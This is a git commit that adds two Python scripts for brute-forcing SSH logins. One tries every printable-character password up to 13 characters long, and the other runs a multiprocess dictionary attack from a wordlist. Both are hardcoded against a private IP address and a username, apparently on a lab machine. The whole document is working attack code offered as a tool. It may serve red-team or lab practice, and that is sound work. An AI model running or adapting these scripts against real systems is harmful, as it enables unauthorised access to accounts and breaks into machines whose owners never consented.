cc275e6b782c0edc34892fc92735688f719ece44
Har1sh-k <hkolla03@gmail.com>
2025-02-19 11:47:10 -0600

    Bruteforce Added

---
+++ src/flooding/bruteforce.py
@@ -0,0 +1,55 @@
+import string
+import itertools
+import paramiko
+from tqdm import tqdm
+import time
+
+def bruteforce_ssh(ip_addr,username):
+    min_length=1
+    max_length=13
+    password=''
+
+    alnum=list(string.printable)
+    total_attempts = sum(len(alnum) ** length for length in range(min_length, max_length + 1))
+    count=0
+    for length in range(min_length,max_length+1):
+        for i in tqdm(itertools.product(alnum, repeat=length), total=total_attempts, desc="Brute Force Progress"):
+            password=''.join(i)
+            
+            success=ssh_connect(ip_addr,username,password)
+ 
+            count+=1
+            if success:
+                print("Total Attempts:"+str(count))
+                return success,password
+    return False,None
+
+def ssh_connect(ip_addr,username,password):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        client.connect(ip_addr, username=username, password=password, timeout=1)
+        print("SSH connection successful!")
+        client.close()
+        return True
+    except paramiko.AuthenticationException:
+        #print("Auth failed.")
+        return False
+    except paramiko.SSHException as e:
+        #print(f"\nSSHException: {e}. Retrying...")
+        print("Retrying...")
+        time.sleep(2)
+        success=ssh_connect(ip_addr,username,password)
+        return success
+    except Exception as e:
+        #print(f"An error occurred: {e}")
+        print("An error occurred...")
+        return False
+    
+    
+if __name__ == "__main__":
+    success,password=bruteforce_ssh('172.16.233.149','c2srnano13')
+    if success:
+        print(f"Password found: {password}")
+    else:
+        print("No valid password found.")
---
+++ src/flooding/bruteforce_dict.py
@@ -0,0 +1,71 @@
+from multiprocessing import Pool, cpu_count
+import itertools
+import paramiko
+from tqdm import tqdm
+import time
+
+
+def bruteforce_dict_ssh(ip_addr, username):
+    min_length = 1
+    max_length = 1
+    password = ''
+    
+    with open('red_team_scripts\InsidePro.dic', 'r') as f:
+        content=f.read()
+        
+    
+    alnum = content.split()
+
+    password_combinations = [
+        ''.join(password_tuple)
+        for length in range(min_length, max_length + 1)
+        for password_tuple in itertools.product(alnum, repeat=length)
+    ]
+
+    total_attempts = len(password_combinations) 
+    count = 0
+
+    with Pool(processes=cpu_count()) as pool:  
+        args = [(ip_addr, username, password) for password in password_combinations]
+        for result in tqdm(pool.imap_unordered(worker, args), total=total_attempts, desc="Brute Force Progress"):
+            success, password = result
+            if success:
+                print("Total Attempts:" + str(count))
+                return success, password
+
+    return False, None
+
+
+def worker(args):
+    ip_addr, username, password = args
+    success = ssh_connect(ip_addr, username, password)
+    return success, password
+
+
+def ssh_connect(ip_addr, username, password):
+    client = paramiko.SSHClient()
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    try:
+        client.connect(ip_addr, username=username, password=password, timeout=1)
+        return True
+    except paramiko.AuthenticationException:
+        return False
+    except paramiko.SSHException as e:
+        print("Retrying...")
+        time.sleep(2)
+        success=ssh_connect(ip_addr,username,password)
+        return success
+    except Exception as e:
+        return False
+    finally:
+        client.close()
+        
+if __name__ == "__main__":
+    ip_addr = '172.16.233.149'
+    user_name = 'c2srnano13'
+    success,password=bruteforce_dict_ssh(ip_addr,user_name)
+    if success:
+        print(f"Password found: {password}")
+    else:
+        print("No valid password found.")
+    
